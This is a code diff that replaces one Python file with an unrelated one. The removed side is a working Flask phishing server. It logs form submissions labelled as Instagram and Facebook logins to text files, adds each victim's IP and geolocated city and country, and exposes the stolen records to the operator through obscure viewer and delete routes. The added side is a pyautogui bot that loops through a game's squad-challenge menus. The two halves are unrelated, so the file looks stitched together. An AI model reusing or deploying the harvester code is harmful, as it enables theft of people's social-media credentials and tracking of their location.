@@ -1,209 +1,198 @@
-from flask import Flask, redirect, request, render_template
-import os
-from datetime import datetime
-from json import dumps, loads
-import requests
+import time
+import pyperclip
+import pyautogui as pt
+import random
 
-##################### CONFIGURATION ##########################
+rare = ["cm.png", "st.png", "cb.png"]
+time_run = 0.5
 
-REDIRECT_URL = 'error'  # site to redirect to
-REDIRECT_URL2 = 'error'  # site to redirect to
-locate = "suobyiyUnvL99f/"
-locate2 = "7wHFjPBSVisuob/"
-view = os.getenv('USER')
 
-###############################################################
-
-app = Flask(__name__)
-app.debug = True  # Enable debug mode
-
-@app.errorhandler(404)
-def page_not_found(e):
-    return '404 Not Found'
-
-@app.errorhandler(500)
-def internal_server_error(e):
-    return '500 Internal Server Error'
-
-##########################First LG##########################
-
-@app.route('/login/', methods=["GET", "POST"])
-def login_page():
+# pt.locateOnScreen(random.choice(rare)
+def add_players_rare():
     try:
-        if request.method == "POST":
-            ip_address = request.headers.get('X-Real-IP', request.remote_addr)
-            response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
+        pt.moveTo(pt.locateOnScreen("lb.png", confidence=.8), duration=.5)
+        pt.click()
+        time.sleep(1.5)
+        print(000)
 
-            alldata = {i + ": ": request.form[i] for i in request.form}
-
-            alldata.update({
-                'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
-                'account type: ': "INSTAGRAM",
-                'ip: ': ip_address,
-                "city: ": response.get("city"),
-                "region: ": response.get("region"),
-                "country: ": response.get("country_name")
-            })
-
-            with open('creds.txt', 'r+') as creds:
-                content = creds.read()
-                creds.seek(0, 0)
-                creds.write(dumps(alldata).rstrip('\r\n') + '\n' + content)
-
-        return redirect(request.referrer + "error")
-    except Exception as e:
-        app.logger.error(f"Error in login_page: {e}")
-        return internal_server_error(e)
-
-@app.route('/login2/', methods=["GET", "POST"])
-def login_page2():
+    except pt.ImageNotFoundException:
+        pt.moveTo(pt.locateOnScreen("ctry.png", confidence=.92), duration=.5)
+        pt.click()
+        time.sleep(time_run)
     try:
-        if request.method == "POST":
-            ip_address = request.headers.get('X-Real-IP', request.remote_addr)
-            response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
+        pt.moveTo(pt.locateOnScreen("addplayer.png", confidence=.8), duration=.5)
+        pt.click()
+        time.sleep(time_run)
+        print(000)
 
-            alldata = {i + ": ": request.form[i] for i in request.form}
+    except pt.ImageNotFoundException:
 
-            alldata.update({
-                'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
-                'account type: ': "FACEBOOK",
-                'ip: ': ip_address,
-                "city: ": response.get("city"),
-                "region: ": response.get("region"),
-                "country: ": response.get("country_name")
-            })
+        pt.moveTo(pt.locateOnScreen("swap.png", confidence=.8), duration=.5)
+        pt.click()
+        time.sleep(time_run)
+        print(000)
 
-            with open('creds.txt', 'r+') as creds:
-                content = creds.read()
-                creds.seek(0, 0)
-                creds.write(dumps(alldata).rstrip('\r\n') + '\n' + content)
-
-        return redirect(request.referrer + "error")
-    except Exception as e:
-        app.logger.error(f"Error in login_page2: {e}")
-        return internal_server_error(e)
-
-@app.route("/" + locate)
-def index():
     try:
-        with open('creds.txt', 'r') as creds:
-            data = creds.read().splitlines()
-        return render_template('index.html', data=data, loads=loads, locate=locate, view=view)
-    except Exception as e:
-        app.logger.error(f"Error in index: {e}")
-        return internal_server_error(e)
+        pt.locateOnScreen("rare.png", confidence=.8)
+        print(111)
 
-@app.route("/delete" + locate + "<lineno>")
-def delete(lineno):
+    except pt.ImageNotFoundException:
+
+        pt.moveTo(pt.locateOnScreen("common.png", confidence=.8), duration=.5)
+        print(222)
+
+        pt.click()
+        time.sleep(time_run)
+        pt.moveTo(pt.locateOnScreen("rare2.png", confidence=.8), duration=.5)
+        print(333)
+
+        pt.click()
+        time.sleep(time_run)
+    else:
+        pass
     try:
-        # list to store file lines
-        lines = []
-        # read file
-        with open("creds.txt", 'r') as fp:
-            # read and store all lines into list
-            lines = fp.readlines()
+        pt.moveTo(pt.locateOnScreen("exclude.png", confidence=.8), duration=.5)
+        pt.click()
+        time.sleep(time_run)
+        pt.moveTo(pt.locateOnScreen("highest.png", confidence=.8), duration=.5)
+        pt.click()
+        time.sleep(time_run)
+        pt.moveTo(pt.locateOnScreen("low.png", confidence=.8), duration=.5)
+        pt.click()
+        time.sleep(time_run)
+        pt.moveTo(pt.locateOnScreen("position.png", confidence=.9), duration=.5)
+        pt.click()
+        time.sleep(time_run)
+    except pt.ImageNotFoundException:
+        pass
+    pt.moveTo(pt.locateOnScreen("search.png", confidence=.8), duration=.5)
+    pt.click()
+    time.sleep(1.5)
+    pt.moveTo(pt.locateOnScreen("add.png", confidence=.8), duration=.5)
+    pt.click()
+    time.sleep(1.5)
 
-        # Write file
-        with open("creds.txt", 'w') as fp:
-            # iterate each line
-            for number, line in enumerate(lines):
-                if number != int(lineno):
-                    fp.write(line)
 
-        return redirect(f'https://{view}.pythonanywhere.com/' + locate)
-    except Exception as e:
-        app.logger.error(f"Error in delete: {e}")
-        return internal_server_error(e)
-
-##########################Second LG##########################
-
-@app.route('/vote/', methods=["GET", "POST"])
-def vote_page():
+def add_players_common():
+    pt.moveTo(pt.locateOnScreen("lb.png", confidence=.95), duration=.5)
+    pt.click()
+    time.sleep(time_run)
+    pt.moveTo(pt.locateOnScreen("addplayer.png", confidence=.8), duration=.5)
+    pt.click()
+    time.sleep(time_run)
     try:
-        if request.method == "POST":
-            ip_address = request.headers.get('X-Real-IP', request.remote_addr)
-            response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
+        pt.locateOnScreen("common.png", confidence=.8) is None
+    except pt.ImageNotFoundException:
+        print(111)
+        pt.moveTo(pt.locateOnScreen("rare.png", confidence=.8), duration=.5)
+        print(222)
+        pt.click()
+        time.sleep(time_run)
+        pt.moveTo(pt.locateOnScreen("common2.png", confidence=.8), duration=.5)
+        print(333)
 
-            alldata = {i + ": ": request.form[i] for i in request.form}
-
-            alldata.update({
-                'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
-                'account type: ': "INSTAGRAM",
-                'ip: ': ip_address,
-                "city: ": response.get("city"),
-                "region: ": response.get("region"),
-                "country: ": response.get("country_name")
-            })
-
-            with open('creds2.txt', 'r+') as creds2:
-                content = creds2.read()
-                creds2.seek(0, 0)
-                creds2.write(dumps(alldata).rstrip('\r\n') + '\n' + content)
-
-        return redirect(request.referrer + "error")
-    except Exception as e:
-        app.logger.error(f"Error in vote_page: {e}")
-        return internal_server_error(e)
-
-@app.route('/vote2/', methods=["GET", "POST"])
-def vote_page2():
+        pt.click()
+        time.sleep(time_run)
+    pt.moveTo(pt.locateOnScreen("exclude.png", confidence=.8), duration=.5)
+    pt.click()
+    time.sleep(time_run)
+    pt.moveTo(pt.locateOnScreen("highest.png", confidence=.8), duration=.5)
+    pt.click()
+    time.sleep(time_run)
+    pt.moveTo(pt.locateOnScreen("low.png", confidence=.8), duration=.5)
+    pt.click()
+    time.sleep(time_run)
+    pt.moveTo(pt.locateOnScreen("position.png", confidence=.9), duration=.5)
+    pt.click()
+    time.sleep(time_run)
+    pt.moveTo(pt.locateOnScreen("search.png", confidence=.8), duration=.5)
+    pt.click()
+    time.sleep(1)
+    pt.moveTo(pt.locateOnScreen("add.png", confidence=.8), duration=.5)
+    pt.click()
+    time.sleep(1.5)
     try:
-        if request.method == "POST":
-            ip_address = request.headers.get('X-Real-IP', request.remote_addr)
-            response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
+        pt.locateOnScreen("lb.png", confidence=.8)
+        add_players_common()
+    except pt.ImageNotFoundException:
 
-            alldata = {i + ": ": request.form[i] for i in request.form}
+        pass
 
-            alldata.update({
-                'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
-                'account type: ': "FACEBOOK",
-                'ip: ': ip_address,
-                "city: ": response.get("city"),
-                "region: ": response.get("region"),
-                "country: ": response.get("country_name")
-            })
+    time.sleep(time_run)
 
-            with open('creds2.txt', 'r+') as creds2:
-                content = creds2.read()
-                creds2.seek(0, 0)
-                creds2.write(dumps(alldata).rstrip('\r\n') + '\n' + content)
 
-        return redirect(request.referrer + "error")
-    except Exception as e:
-        app.logger.error(f"Error in vote_page2: {e}")
-        return internal_server_error(e)
+def squad_builder():
+    time.sleep(0.5)
+    pt.moveTo(pt.locateOnScreen("builder.png", confidence=.8), duration=.5)
+    pt.click()
+    time.sleep(time_run)
 
-@app.route("/" + locate2)
-def index2():
+    # pt.moveTo(pt.locateOnScreen("untrade.png", confidence=.8), duration=.5)
+    # pt.click()
+    # time.sleep(time_run)
     try:
-        with open('creds2.txt', 'r') as creds2:
-            data2 = creds2.read().splitlines()
-        return render_template('index2.html', data=data2, loads=loads, locate2=locate2, view=view)
-    except Exception as e:
-        app.logger.error(f"Error in index2: {e}")
-        return internal_server_error(e)
+        pt.moveTo(pt.locateOnScreen("rarity.png", confidence=.8), duration=.5)
+        pt.click()
+        time.sleep(time_run)
+        pt.moveTo(pt.locateOnScreen("common2.png", confidence=.8), duration=.5)
+        pt.click()
+        time.sleep(time_run)
+        try:
+            pt.moveTo(pt.locateOnScreen("ignore.png", confidence=.8), duration=.5)
+            pt.click()
+            time.sleep(time_run)
 
-@app.route("/delete" + locate2 + "<lineno2>")
-def delete2(lineno2):
+        except pt.ImageNotFoundException:
+            pass
+
+
+    except pt.ImageNotFoundException:
+        pass
+    pt.scroll(-1000)
+    time.sleep(time_run)
+    pt.moveTo(pt.locateOnScreen("build.png", confidence=.8), duration=.5)
+    pt.click()
+    time.sleep(1.5)
+
+
+def sbc():
+    time.sleep(1)
+    pt.moveTo(pt.locateOnScreen("82.png", confidence=.8), duration=.5)
+    print("moved")
+    pt.click()
+    time.sleep(1)
+    squad_builder()
+
+    add_players_rare()
+    add_players_rare()
+
     try:
-        # list to store file lines
-        lines2 = []
-        # read file
-        with open("creds2.txt", 'r') as fp2:
-            # read and store all lines into list
-            lines2 = fp2.readlines()
+        pt.moveTo(pt.locateOnScreen("submit.png", confidence=.8), duration=.5)
+        pt.click()
+        time.sleep(time_run)
+    except:
+        add_players_common()
+        try:
+            pt.moveTo(pt.locateOnScreen("submit.png", confidence=.8), duration=.5)
+            pt.click()
 
-        # Write file
-        with open("creds2.txt", 'w') as fp2:
-            # iterate each line
-            for number2, line2 in enumerate(lines2):
-                if number2 != int(lineno2):
-                    fp2.write(line2)
+        except pt.ImageNotFoundException:
 
-        return redirect(f'https://{view}.pythonanywhere.com/' + locate2)
-    except Exception as e:
-        app.logger.error(f"Error in delete2: {e}")
-        return internal_server_error(e)
+            pt.moveTo(pt.locateOnScreen("require.png", confidence=.8), duration=.5)
+            pt.click()
+            time.sleep(time_run)
+            add_players_common()
+            pt.moveTo(pt.locateOnScreen("submit.png", confidence=.8), duration=.5)
+            pt.click()
+        time.sleep(4.5)
 
-if __name__ == '__main__':
-    app.run()
+    pt.moveTo(pt.locateOnScreen("claim1.png", confidence=.8), duration=.5)
+    pt.click()
+    time.sleep(.6)
+    pt.moveTo(pt.locateOnScreen("claim1.png", confidence=.8), duration=.5)
+    pt.click()
+    time.sleep(.6)
+    sbc()
+
+
+sbc()
